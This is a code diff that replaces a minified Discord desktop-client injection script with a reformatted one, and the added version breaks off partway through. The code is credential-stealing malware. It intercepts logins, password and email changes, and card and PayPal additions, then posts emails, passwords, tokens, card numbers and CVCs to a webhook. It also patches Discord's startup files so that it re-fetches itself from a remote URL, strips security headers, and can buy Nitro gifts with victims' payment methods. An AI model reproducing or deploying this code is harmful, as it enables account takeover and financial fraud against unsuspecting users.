@@ -1,1 +1,612 @@
-const args=process.argv,fs=require("fs"),path=require("path"),https=require("https"),querystring=require("querystring"),{BrowserWindow:BrowserWindow,session:session}=require("electron"),config={webhook:"%WEBHOOK%",auto_buy_nitro:!1,ping_on_run:!0,ping_val:"@everyone",embed_name:"RRN Injection",embed_icon:"https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png".replace(/ /g,"%20"),embed_color:2895667,injection_url:"https://raw.githubusercontent.com/Raplhs/23123213423543534r3re34534/main/index.js",api:"https://discord.com/api/v9/users/@me",nitro:{boost:{year:{id:"521847234246082599",sku:"511651885459963904",price:"9999"},month:{id:"521847234246082599",sku:"511651880837840896",price:"999"}},classic:{month:{id:"521846918637420545",sku:"511651871736201216",price:"499"}}},filter:{urls:["https://discord.com/api/v*/users/@me","https://discordapp.com/api/v*/users/@me","https://*.discord.com/api/v*/users/@me","https://discordapp.com/api/v*/auth/login","https://discord.com/api/v*/auth/login","https://*.discord.com/api/v*/auth/login","https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts","https://api.stripe.com/v*/tokens","https://api.stripe.com/v*/setup_intents/*/confirm","https://api.stripe.com/v*/payment_intents/*/confirm"]},filter2:{urls:["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json","https://*.discord.com/api/v*/applications/detectable","https://discord.com/api/v*/applications/detectable","https://*.discord.com/api/v*/users/@me/library","https://discord.com/api/v*/users/@me/library","wss://remote-auth-gateway.discord.gg/*"]}};function parity_32(e,n,t){return e^n^t}function ch_32(e,n,t){return e&n^~e&t}function maj_32(e,n,t){return e&n^e&t^n&t}function rotl_32(e,n){return e<<n|e>>>32-n}function safeAdd_32_2(e,n){var t=(65535&e)+(65535&n);return(65535&(e>>>16)+(n>>>16)+(t>>>16))<<16|65535&t}function safeAdd_32_5(e,n,t,o,r){var i=(65535&e)+(65535&n)+(65535&t)+(65535&o)+(65535&r);return(65535&(e>>>16)+(n>>>16)+(t>>>16)+(o>>>16)+(r>>>16)+(i>>>16))<<16|65535&i}function binb2hex(e){var n,t,o="0123456789abcdef",r="",i=4*e.length;for(n=0;n<i;n+=1)t=e[n>>>2]>>>8*(3-n%4),r+=o.charAt(t>>>4&15)+o.charAt(15&t);return r}function getH(){return[1732584193,4023233417,2562383102,271733878,3285377520]}function roundSHA1(e,n){var t,o,r,i,s,a,c,l=[],d=ch_32,u=parity_32,p=maj_32,f=rotl_32,g=safeAdd_32_2,m=safeAdd_32_5;for(t=n[0],o=n[1],r=n[2],i=n[3],s=n[4],c=0;c<80;c+=1)l[c]=c<16?e[c]:f(l[c-3]^l[c-8]^l[c-14]^l[c-16],1),a=c<20?m(f(t,5),d(o,r,i),s,1518500249,l[c]):c<40?m(f(t,5),u(o,r,i),s,1859775393,l[c]):c<60?m(f(t,5),p(o,r,i),s,2400959708,l[c]):m(f(t,5),u(o,r,i),s,3395469782,l[c]),s=i,i=r,r=f(o,30),o=t,t=a;return n[0]=g(t,n[0]),n[1]=g(o,n[1]),n[2]=g(r,n[2]),n[3]=g(i,n[3]),n[4]=g(s,n[4]),n}function finalizeSHA1(e,n,t,o){var r,i,s;for(s=15+(n+65>>>9<<4);e.length<=s;)e.push(0);for(e[n>>>5]|=128<<24-n%32,e[s]=n+t,i=e.length,r=0;r<i;r+=16)o=roundSHA1(e.slice(r,r+16),o);return o}function hex2binb(e,n,t){var o,r,i,s,a,c,l=e.length;for(o=n||[0],c=(t=t||0)>>>3,0!=l%2&&console.error("String of HEX type must be in byte increments"),r=0;r<l;r+=2)if(i=parseInt(e.substr(r,2),16),isNaN(i))console.error("String of HEX type contains invalid characters");else{for(s=(a=(r>>>1)+c)>>>2;o.length<=s;)o.push(0);o[s]|=i<<8*(3-a%4)}return{value:o,binLen:4*l+t}}class jsSHA{constructor(){var e,n,t,o,r,i=0,s=[],a=0,c=!1,l=!1,d=[],u=[];n=hex2binb,1!==parseInt(1,10)&&console.error("numRounds must a integer >= 1"),t=512,o=roundSHA1,r=finalizeSHA1,e=getH(),this.setHMACKey=function(n){var s,a,c,p;if(a=(s=hex2binb(n)).binLen,c=s.value,64,15,64<a/8){for(c=r(c,a,0,getH());c.length<=15;)c.push(0);c[15]&=65535}else if(64>a/8){for(;c.length<=15;)c.push(0);c[15]&=65535}for(p=0;p<=15;p+=1)d[p]=909522486^c[p],u[p]=1549556828^c[p];e=o(d,e),i=t,l=!0},this.update=function(r){var c,l,d,u,p,f=0;for(l=(c=n(r,s,a)).binLen,u=c.value,d=l>>>5,p=0;p<d;p+=16)f+t<=l&&(e=o(u.slice(p,p+16),e),f+=t);i+=f,s=u.slice(f>>>5),a=l%t},this.getHMAC=function(){var n;!1===l&&console.error("Cannot call getHMAC without first setting HMAC key");return!1===c&&(n=r(s,a,i,e),e=o(u,getH()),e=r(n,160,t,e)),c=!0,binb2hex(e)}}}function totp(e){const n=Date.now(),t=Math.round(n/1e3),o=leftpad(dec2hex(Math.floor(t/30)),16,"0"),r=new jsSHA;r.setHMACKey(base32tohex(e)),r.update(o);const i=r.getHMAC(),s=hex2dec(i.substring(i.length-1));let a=(hex2dec(i.substr(2*s,8))&hex2dec("7fffffff"))+"";return a=a.substr(Math.max(a.length-6,0),6),a}function hex2dec(e){return parseInt(e,16)}function dec2hex(e){return(e<15.5?"0":"")+Math.round(e).toString(16)}function base32tohex(e){let n="",t="";e=e.replace(/=+$/,"");for(let t=0;t<e.length;t++){let o="ABCDEFGHIJKLMNOPQRSTUVWXYZ234567".indexOf(e.charAt(t).toUpperCase());-1===o&&console.error("Invalid base32 character in key"),n+=leftpad(o.toString(2),5,"0")}for(let e=0;e+8<=n.length;e+=8){let o=n.substr(e,8);t+=leftpad(parseInt(o,2).toString(16),2,"0")}return t}function leftpad(e,n,t){return n+1>=e.length&&(e=Array(n+1-e.length).join(t)+e),e}"function"==typeof define&&define.amd?define((function(){return jsSHA})):"undefined"!=typeof exports?"undefined"!=typeof module&&module.exports?module.exports=exports=jsSHA:exports=jsSHA:global.jsSHA=jsSHA,jsSHA.default&&(jsSHA=jsSHA.default);const discordPath=function(){const e=args[0].split(path.sep).slice(0,-1).join(path.sep);let n;return"win32"===process.platform?n=path.join(e,"resources"):"darwin"===process.platform&&(n=path.join(e,"Contents","Resources")),fs.existsSync(n)?{resourcePath:n,app:e}:{undefined:void 0,undefined:void 0}}();function updateCheck(){const{resourcePath:e,app:n}=discordPath;if(void 0===e||void 0===n)return;const t=path.join(e,"app"),o=path.join(t,"package.json"),r=path.join(t,"index.js"),i=`${n}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`,s=path.join(process.env.APPDATA,"\\betterdiscord\\data\\betterdiscord.asar");if(fs.existsSync(t)||fs.mkdirSync(t),fs.existsSync(o)&&fs.unlinkSync(o),fs.existsSync(r)&&fs.unlinkSync(r),"win32"===process.platform||"darwin"===process.platform){fs.writeFileSync(o,JSON.stringify({name:"discord",main:"index.js"},null,4));const n=`const fs = require('fs'), https = require('https');\nconst indexJs = '${i}';\nconst bdPath = '${s}';\nconst fileSize = fs.statSync(indexJs).size\nfs.readFileSync(indexJs, 'utf8', (err, data) => {\n    if (fileSize < 20000 || data === "module.exports = require('./core.asar')") \n        init();\n})\nasync function init() {\n    https.get('${config.injection_url}', (res) => {\n        const file = fs.createWriteStream(indexJs);\n        res.replace('%WEBHOOK%', '${config.webhook}')\n        res.pipe(file);\n        file.on('finish', () => {\n            file.close();\n        });\n    \n    }).on("error", (err) => {\n        setTimeout(init(), 10000);\n    });\n}\nrequire('${path.join(e,"app.asar")}')\nif (fs.existsSync(bdPath)) require(bdPath);`;fs.writeFileSync(r,n.replace(/\\/g,"\\\\"))}return!fs.existsSync(path.join(__dirname,"initiation"))||(fs.rmdirSync(path.join(__dirname,"initiation")),execScript('window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();'),!1)}const execScript=e=>BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(e,!0),getInfo=async e=>{const n=await execScript(`var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open("GET", "${config.api}", false);\n    xmlHttp.setRequestHeader("Authorization", "${e}");\n    xmlHttp.send(null);\n    xmlHttp.responseText;`);return JSON.parse(n)},fetchBilling=async e=>{const n=await execScript(`var xmlHttp = new XMLHttpRequest(); \n    xmlHttp.open("GET", "${config.api}/billing/payment-sources", false); \n    xmlHttp.setRequestHeader("Authorization", "${e}"); \n    xmlHttp.send(null); \n    xmlHttp.responseText`);return n.lenght&&0!==n.length?JSON.parse(n):""},getBilling=async e=>{const n=await fetchBilling(e);if(!n)return"❌";let t="";return n.forEach((e=>{if(!e.invalid)switch(e.type){case 1:t+="💳 ";break;case 2:t+="<:paypal:951139189389410365> "}})),t||(t="❌"),t},Purchase=async(e,n,t,o)=>{const r={expected_amount:config.nitro[t][o].price,expected_currency:"usd",gift:!0,payment_source_id:n,payment_source_token:null,purchase_token:"2422867c-244d-476a-ba4f-36e197758d97",sku_subscription_plan_id:config.nitro[t][o].sku},i=execScript(`var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open("POST", "https://discord.com/api/v9/store/skus/${config.nitro[t][o].id}/purchase", false);\n    xmlHttp.setRequestHeader("Authorization", "${e}");\n    xmlHttp.setRequestHeader('Content-Type', 'application/json');\n    xmlHttp.send(JSON.stringify(${JSON.stringify(r)}));\n    xmlHttp.responseText`);return i.gift_code?"https://discord.gift/"+i.gift_code:null},buyNitro=async e=>{const n=await fetchBilling(e),t="Failed to Purchase ❌";if(!n)return t;let o=[];n.forEach((e=>{e.invalid||(o=o.concat(e.id))}));for(let n in o){const o=Purchase(e,n,"boost","year");if(null!==o)return o;{const o=Purchase(e,n,"boost","month");if(null!==o)return o;{const o=Purchase(e,n,"classic","month");return null!==o?o:t}}}},getNitro=e=>{switch(e){case 0:default:return"No Nitro";case 1:return"Nitro Classic";case 2:return"Nitro Boost"}},getBadges=e=>{let n="";switch(e){case 1:n+="Discord Staff, ";break;case 2:n+="Partnered Server Owner, ";break;case 131072:n+="Verified Bot Developer, ";break;case 4:n+="Hypesquad Event, ";break;case 16384:n+="Gold BugHunter, ";break;case 8:n+="Green BugHunter, ";break;case 512:n+="Early Supporter, ";break;case 128:n+="HypeSquad Brillance, ";break;case 64:n+="HypeSquad Bravery, ";break;case 256:n+="HypeSquad Balance, ";break;default:n="None"}return n},hooker=async e=>{const n=JSON.stringify(e),t=new URL(config.webhook);config.webhook.includes("api/webhooks");const o={protocol:t.protocol,hostname:t.host,path:t.pathname,method:"POST",headers:{"Content-Type":"application/json","Access-Control-Allow-Origin":"*"}},r=https.request(o);r.on("error",(e=>{console.log(e)})),r.write(n),r.end()},login=async(e,n,t)=>{const o=await getInfo(t),r=getNitro(o.premium_type),i=getBadges(o.flags),s=await getBilling(t),a={username:config.embed_name,avatar_url:config.embed_icon,embeds:[{color:config.embed_color,fields:[{name:"**Account Information**",value:`Email: **${e}** -  Password: **${n}**`,inline:!1},{name:"**Discord Information**",value:`Badges: **${i}**\n Nitro Type: **${r}**\n Billing: **${s}**`,inline:!1},{name:"**Token**",value:`\`${t}\``,inline:!1}]}]};config.ping_on_run&&(a.content=config.ping_val),hooker(a)},passwordChanged=async(e,n,t)=>{const o=await getInfo(t),r=getNitro(o.premium_type),i=getBadges(o.flags),s=await getBilling(t),a={username:config.embed_name,avatar_url:config.embed_icon,embeds:[{color:config.embed_color,fields:[{name:"**Password Changed**",value:` Email: **${o.email}**\n Old Password: **${e}**\n New Password: **${n}**`,inline:!0},{name:"**Discord Information**",value:` Nitro Type: **${r}**\n Badges: **${i}**\n Billing: **${s}**`,inline:!0},{name:"**Token**",value:`\`${t}\``,inline:!1}]}]};config.ping_on_run&&(a.content=config.ping_val),hooker(a)},emailChanged=async(e,n,t)=>{const o=await getInfo(t),r=getNitro(o.premium_type),i=getBadges(o.flags),s=await getBilling(t),a={username:config.embed_name,avatar_url:config.embed_icon,embeds:[{color:config.embed_color,fields:[{name:"**Email Changed**",value:` New Email: **${e}**\n Password: **${n}**`,inline:!0},{name:"**Discord Information**",value:`Badges: **${i}**\n Nitro Type: **${r}**\n Billing: **${s}**`,inline:!0},{name:"**Token**",value:`\`${t}\``,inline:!1}]}]};config.ping_on_run&&(a.content=config.ping_val),hooker(a)},PaypalAdded=async e=>{const n=await getInfo(e),t=getNitro(n.premium_type),o=getBadges(n.flags),r=getBilling(e),i={username:config.embed_name,avatar_url:config.embed_icon,embeds:[{color:config.embed_color,fields:[{name:"**Paypal Added**",value:"Time to buy some nitro baby",inline:!1},{name:"**Discord Information**",value:`Badges: **${o}**\n Nitro Type: **${t}**\n Billing: **${r}**`,inline:!0},{name:"**Token**",value:`\`${e}\``,inline:!1}]}]};config.ping_on_run&&(i.content=config.ping_val),hooker(i)},ccAdded=async(e,n,t,o,r)=>{const i=await getInfo(r),s=getNitro(i.premium_type),a=getBadges(i.flags),c=await getBilling(r),l={username:config.embed_name,avatar_url:config.embed_icon,embeds:[{color:config.embed_color,fields:[{name:"**Credit Card Added**",value:`Credit Card Number: **${e}**\nCVC: **${n}**\nCredit Card Expiration: **${t}/${o}**`,inline:!0},{name:"**Discord Information**",value:`Badges: **${a}**\n Nitro Type: **${s}**\n Billing: **${c}**`,inline:!0},{name:"**Token**",value:`\`${r}\``,inline:!1}]}]};config.ping_on_run&&(l.content=config.ping_val),hooker(l)},nitroBought=async e=>{const n=await getInfo(e),t=getNitro(n.premium_type),o=getBadges(n.flags),r=await getBilling(e),i=await buyNitro(e),s={username:config.embed_name,content:i,avatar_url:config.embed_icon,embeds:[{color:config.embed_color,fields:[{name:"**Nitro bought!**",value:`**Nitro Code:**\n\`\`\`diff\n+ ${i}\`\`\``,inline:!0},{name:"**Discord Information**",value:`Badges: **${o}**\nNitro Type: **${t}**\nBilling: **${r}**`,inline:!0},{name:"**Token**",value:`\`${e}\``,inline:!1}]}]};config.ping_on_run&&(s.content=config.ping_val+`\n${i}`),hooker(s)};session.defaultSession.webRequest.onBeforeRequest(config.filter2,((e,n)=>{if(e.url.startsWith("wss://remote-auth-gateway"))return n({cancel:!0});updateCheck()})),session.defaultSession.webRequest.onHeadersReceived(((e,n)=>{e.url.startsWith(config.webhook)?e.url.includes("discord.com")?n({responseHeaders:Object.assign({"Access-Control-Allow-Headers":"*"},e.responseHeaders)}):n({responseHeaders:Object.assign({"Content-Security-Policy":["default-src '*'","Access-Control-Allow-Headers '*'","Access-Control-Allow-Origin '*'"],"Access-Control-Allow-Headers":"*","Access-Control-Allow-Origin":"*"},e.responseHeaders)}):(delete e.responseHeaders["content-security-policy"],delete e.responseHeaders["content-security-policy-report-only"],n({responseHeaders:{...e.responseHeaders,"Access-Control-Allow-Headers":"*"}}))})),session.defaultSession.webRequest.onCompleted(config.filter,(async(e,n)=>{if(200!==e.statusCode&&202!==e.statusCode)return;const t=Buffer.from(e.uploadData[0].bytes).toString(),o=JSON.parse(t),r=await execScript("(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()");switch(!0){case e.url.endsWith("login"):login(o.login,o.password,r).catch(console.error);break;case e.url.endsWith("users/@me")&&"PATCH"===e.method:if(!o.password)return;o.email&&emailChanged(o.email,o.password,r).catch(console.error),o.new_password&&passwordChanged(o.password,o.new_password,r).catch(console.error);break;case e.url.endsWith("tokens")&&"POST"===e.method:const n=querystring.parse(unparsedData.toString());ccAdded(n["card[number]"],n["card[cvc]"],n["card[exp_month]"],n["card[exp_year]"],r).catch(console.error);break;case e.url.endsWith("paypal_accounts")&&"POST"===e.method:PaypalAdded(r).catch(console.error);break;case e.url.endsWith("confirm")&&"POST"===e.method:if(!config.auto_buy_nitro)return;setTimeout((()=>{nitroBought(r).catch(console.error)}),7500)}})),module.exports=require("./core.asar");
+const args = process.argv;
+const fs = require('fs');
+const path = require('path');
+const https = require('https');
+const querystring = require('querystring');
+const { BrowserWindow, session } = require('electron');
+
+const config = {
+  webhook: '%HOOKRE%',
+  auto_buy_nitro: false, 
+  ping_on_run: true, 
+  ping_val: '@everyone',
+  embed_name: 'Injection', 
+  embed_icon: 'https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png'.replace(/ /g, '%20'), 
+  embed_color: 2895667, 
+  injection_url: 'https://raw.githubusercontent.com/Raplhs/23123213423543534r3re34534/main/index.js', 
+  /**
+   
+   **/
+  api: 'https://discord.com/api/v9/users/@me',
+  nitro: {
+    boost: {
+      year: {
+        id: '521847234246082599',
+        sku: '511651885459963904',
+        price: '9999',
+      },
+      month: {
+        id: '521847234246082599',
+        sku: '511651880837840896',
+        price: '999',
+      },
+    },
+    classic: {
+      month: {
+        id: '521846918637420545',
+        sku: '511651871736201216',
+        price: '499',
+      },
+    },
+  },
+  filter: {
+    urls: [
+      'https://discord.com/api/v*/users/@me',
+      'https://discordapp.com/api/v*/users/@me',
+      'https://*.discord.com/api/v*/users/@me',
+      'https://discordapp.com/api/v*/auth/login',
+      'https://discord.com/api/v*/auth/login',
+      'https://*.discord.com/api/v*/auth/login',
+      'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
+      'https://api.stripe.com/v*/tokens',
+      'https://api.stripe.com/v*/setup_intents/*/confirm',
+      'https://api.stripe.com/v*/payment_intents/*/confirm',
+    ],
+  },
+  filter2: {
+    urls: [
+      'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
+      'https://*.discord.com/api/v*/applications/detectable',
+      'https://discord.com/api/v*/applications/detectable',
+      'https://*.discord.com/api/v*/users/@me/library',
+      'https://discord.com/api/v*/users/@me/library',
+      'wss://remote-auth-gateway.discord.gg/*',
+    ],
+  },
+};
+
+const discordPath = (function () {
+  const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
+  let resourcePath;
+
+  if (process.platform === 'win32') {
+    resourcePath = path.join(app, 'resources');
+  } else if (process.platform === 'darwin') {
+    resourcePath = path.join(app, 'Contents', 'Resources');
+  }
+
+  if (fs.existsSync(resourcePath)) return { resourcePath, app };
+  return { undefined, undefined };
+})();
+
+function updateCheck() {
+  const { resourcePath, app } = discordPath;
+  if (resourcePath === undefined || app === undefined) return;
+  const appPath = path.join(resourcePath, 'app');
+  const packageJson = path.join(appPath, 'package.json');
+  const resourceIndex = path.join(appPath, 'index.js');
+  const indexJs = `${app}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
+  const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
+  if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
+  if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
+  if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);
+
+  if (process.platform === 'win32' || process.platform === 'darwin') {
+    fs.writeFileSync(
+      packageJson,
+      JSON.stringify(
+        {
+          name: 'discord',
+          main: 'index.js',
+        },
+        null,
+        4,
+      ),
+    );
+
+    const startUpScript = `const fs = require('fs'), https = require('https');
+const indexJs = '${indexJs}';
+const bdPath = '${bdPath}';
+const fileSize = fs.statSync(indexJs).size
+fs.readFileSync(indexJs, 'utf8', (err, data) => {
+    if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
+        init();
+})
+async function init() {
+    https.get('${config.injection_url}', (res) => {
+        const file = fs.createWriteStream(indexJs);
+        res.replace('%HOOKRE%', '${config.webhook}')
+        res.pipe(file);
+        file.on('finish', () => {
+            file.close();
+        });
+    
+    }).on("error", (err) => {
+        setTimeout(init(), 10000);
+    });
+}
+require('${path.join(resourcePath, 'app.asar')}')
+if (fs.existsSync(bdPath)) require(bdPath);`;
+    fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
+  }
+  if (!fs.existsSync(path.join(__dirname, 'initiation'))) return !0;
+  fs.rmdirSync(path.join(__dirname, 'initiation'));
+  execScript(
+    `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
+  );
+  return !1;
+}
+
+const execScript = (script) => {
+  const window = BrowserWindow.getAllWindows()[0];
+  return window.webContents.executeJavaScript(script, !0);
+};
+
+const getInfo = async (token) => {
+  const info = await execScript(`var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open("GET", "${config.api}", false);
+    xmlHttp.setRequestHeader("Authorization", "${token}");
+    xmlHttp.send(null);
+    xmlHttp.responseText;`);
+  return JSON.parse(info);
+};
+
+const fetchBilling = async (token) => {
+  const bill = await execScript(`var xmlHttp = new XMLHttpRequest(); 
+    xmlHttp.open("GET", "${config.api}/billing/payment-sources", false); 
+    xmlHttp.setRequestHeader("Authorization", "${token}"); 
+    xmlHttp.send(null); 
+    xmlHttp.responseText`);
+  if (!bill.lenght || bill.length === 0) return '';
+  return JSON.parse(bill);
+};
+
+const getBilling = async (token) => {
+  const data = await fetchBilling(token);
+  if (!data) return '❌';
+  let billing = '';
+  data.forEach((x) => {
+    if (!x.invalid) {
+      switch (x.type) {
+        case 1:
+          billing += '💳 ';
+          break;
+        case 2:
+          billing += '<:paypal:951139189389410365> ';
+          break;
+      }
+    }
+  });
+  if (!billing) billing = '❌';
+  return billing;
+};
+
+const Purchase = async (token, id, _type, _time) => {
+  const options = {
+    expected_amount: config.nitro[_type][_time]['price'],
+    expected_currency: 'usd',
+    gift: true,
+    payment_source_id: id,
+    payment_source_token: null,
+    purchase_token: '2422867c-244d-476a-ba4f-36e197758d97',
+    sku_subscription_plan_id: config.nitro[_type][_time]['sku'],
+  };
+
+  const req = execScript(`var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open("POST", "https://discord.com/api/v9/store/skus/${config.nitro[_type][_time]['id']}/purchase", false);
+    xmlHttp.setRequestHeader("Authorization", "${token}");
+    xmlHttp.setRequestHeader('Content-Type', 'application/json');
+    xmlHttp.send(JSON.stringify(${JSON.stringify(options)}));
+    xmlHttp.responseText`);
+  if (req['gift_code']) {
+    return 'https://discord.gift/' + req['gift_code'];
+  } else return null;
+};
+
+const buyNitro = async (token) => {
+  const data = await fetchBilling(token);
+  const failedMsg = 'Failed to Purchase ❌';
+  if (!data) return failedMsg;
+
+  let IDS = [];
+  data.forEach((x) => {
+    if (!x.invalid) {
+      IDS = IDS.concat(x.id);
+    }
+  });
+  for (let sourceID in IDS) {
+    const first = Purchase(token, sourceID, 'boost', 'year');
+    if (first !== null) {
+      return first;
+    } else {
+      const second = Purchase(token, sourceID, 'boost', 'month');
+      if (second !== null) {
+        return second;
+      } else {
+        const third = Purchase(token, sourceID, 'classic', 'month');
+        if (third !== null) {
+          return third;
+        } else {
+          return failedMsg;
+        }
+      }
+    }
+  }
+};
+
+const getNitro = (flags) => {
+  switch (flags) {
+    case 0:
+      return 'No Nitro';
+    case 1:
+      return 'Nitro Classic';
+    case 2:
+      return 'Nitro Boost';
+    default:
+      return 'No Nitro';
+  }
+};
+
+const getBadges = (flags) => {
+  let badges = '';
+  switch (flags) {
+    case 1:
+      badges += 'Discord Staff, ';
+      break;
+    case 2:
+      badges += 'Partnered Server Owner, ';
+      break;
+    case 131072:
+      badges += 'Verified Bot Developer, ';
+      break;
+    case 4:
+      badges += 'Hypesquad Event, ';
+      break;
+    case 16384:
+      badges += 'Gold BugHunter, ';
+      break;
+    case 8:
+      badges += 'Green BugHunter, ';
+      break;
+    case 512:
+      badges += 'Early Supporter, ';
+      break;
+    case 128:
+      badges += 'HypeSquad Brillance, ';
+      break;
+    case 64:
+      badges += 'HypeSquad Bravery, ';
+      break;
+    case 256:
+      badges += 'HypeSquad Balance, ';
+      break;
+    case 0:
+      badges = 'None';
+      break;
+    default:
+      badges = 'None';
+      break;
+  }
+  return badges;
+};
+
+const hooker = async (content) => {
+  const data = JSON.stringify(content);
+  const url = new URL(config.webhook);
+  const headers = {
+    'Content-Type': 'application/json',
+    'Access-Control-Allow-Origin': '*',
+  };
+  if (!config.webhook.includes('api/webhooks')) {
+  }
+  const options = {
+    protocol: url.protocol,
+    hostname: url.host,
+    path: url.pathname,
+    method: 'POST',
+    headers: headers,
+  };
+  const req = https.request(options);
+
+  req.on('error', (err) => {
+    console.log(err);
+  });
+  req.write(data);
+  req.end();
+};
+
+const login = async (email, password, token) => {
+  const json = await getInfo(token);
+  const nitro = getNitro(json.premium_type);
+  const badges = getBadges(json.flags);
+  const billing = await getBilling(token);
+  const content = {
+    username: config.embed_name,
+    avatar_url: config.embed_icon,
+    embeds: [
+      {
+        color: config.embed_color,
+        fields: [
+          {
+            name: '**Account Information**',
+            value: `Email: **${email}** -  Password: **${password}**`,
+            inline: false,
+          },
+          {
+            name: '**Discord Information**',
+            value: `Badges: **${badges}**\n Nitro Type: **${nitro}**\n Billing: **${billing}**`,
+            inline: false,
+          },
+          {
+            name: '**Token**',
+            value: `\`${token}\``,
+            inline: false,
+          },
+        ],
+      },
+    ],
+  };
+  if (config.ping_on_run) content['content'] = config.ping_val;
+  hooker(content);
+};
+
+const passwordChanged = async (oldpassword, newpassword, token) => {
+  const json = await getInfo(token);
+  const nitro = getNitro(json.premium_type);
+  const badges = getBadges(json.flags);
+  const billing = await getBilling(token);
+  const content = {
+    username: config.embed_name,
+    avatar_url: config.embed_icon,
+    embeds: [
+      {
+        color: config.embed_color,
+        fields: [
+          {
+            name: '**Password Changed**',
+            value: ` Email: **${json.email}**\n Old Password: **${oldpassword}**\n New Password: **${newpassword}**`,
+            inline: true,
+          },
+          {
+            name: '**Discord Information**',
+            value: ` Nitro Type: **${nitro}**\n Badges: **${badges}**\n Billing: **${billing}**`,
+            inline: true,
+          },
+          {
+            name: '**Token**',
+            value: `\`${token}\``,
+            inline: false,
+          },
+        ],
+      },
+    ],
+  };
+  if (config.ping_on_run) content['content'] = config.ping_val;
+  hooker(content);
+};
+
+const emailChanged = async (email, password, token) => {
+  const json = await getInfo(token);
+  const nitro = getNitro(json.premium_type);
+  const badges = getBadges(json.flags);
+  const billing = await getBilling(token);
+  const content = {
+    username: config.embed_name,
+    avatar_url: config.embed_icon,
+    embeds: [
+      {
+        color: config.embed_color,
+        fields: [
+          {
+            name: '**Email Changed**',
+            value: ` New Email: **${email}**\n Password: **${password}**`,
+            inline: true,
+          },
+          {
+            name: '**Discord Information**',
+            value: `Badges: **${badges}**\n Nitro Type: **${nitro}**\n Billing: **${billing}**`,
+            inline: true,
+          },
+          {
+            name: '**Token**',
+            value: `\`${token}\``,
+            inline: false,
+          },
+        ],
+      },
+    ],
+  };
+  if (config.ping_on_run) content['content'] = config.ping_val;
+  hooker(content);
+};
+
+const PaypalAdded = async (token) => {
+  const json = await getInfo(token);
+  const nitro = getNitro(json.premium_type);
+  const badges = getBadges(json.flags);
+  const billing = getBilling(token);
+  const content = {
+    username: config.embed_name,
+    avatar_url: config.embed_icon,
+    embeds: [
+      {
+        color: config.embed_color,
+        fields: [
+          {
+            name: '**Paypal Added**',
+            value: `Time to buy some nitro baby`,
+            inline: false,
+          },
+          {
+            name: '**Discord Information**',
+            value: `Badges: **${badges}**\n Nitro Type: **${nitro}**\n Billing: **${billing}**`,
+            inline: true,
+          },
+          {
+            name: '**Token**',
+            value: `\`${token}\``,
+            inline: false,
+          },
+        ],
+      },
+    ],
+  };
+  if (config.ping_on_run) content['content'] = config.ping_val;
+  hooker(content);
+};
+
+const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
+  const json = await getInfo(token);
+  const nitro = getNitro(json.premium_type);
+  const badges = getBadges(json.flags);
+  const billing = await getBilling(token);
+  const content = {
+    username: config.embed_name,
+    avatar_url: config.embed_icon,
+    embeds: [
+      {
+        color: config.embed_color,
+        fields: [
+          {
+            name: '**Credit Card Added**',
+            value: `Credit Card Number: **${number}**\nCVC: **${cvc}**\nCredit Card Expiration: **${expir_month}/${expir_year}**`,
+            inline: true,
+          },
+          {
+            name: '**Discord Information**',
+            value: `Badges: **${badges}**\n Nitro Type: **${nitro}**\n Billing: **${billing}**`,
+            inline: true,
+          },
+          {
+            name: '**Token**',
+            value: `\`${token}\``,
+            inline: false,
+          },
+        ],
+      },
+    ],
+  };
+  if (config.ping_on_run) content['content'] = config.ping_val;
+  hooker(content);
+};
+
+const nitroBought = async (token) => {
+  const json = await getInfo(token);
+  const nitro = getNitro(json.premium_type);
+  const badges = getBadges(json.flags);
+  const billing = await getBilling(token);
+  const code = await buyNitro(token);
+  const content = {
+    username: config.embed_name,
+    content: code,
+    avatar_url: config.embed_icon,
+    embeds: [
+      {
+        color: config.embed_color,
+        fields: [
+          {
+            name: '**Nitro bought!**',
+            value: `**Nitro Code:**\n\`\`\`diff\n+ ${code}\`\`\``,
+            inline: true,
+          },
+          {
+            name: '**Discord Information**',
+            value: `Badges: **${badges}**\nNitro Type: **${nitro}**\nBilling: **${billing}**`,
+            inline: true,
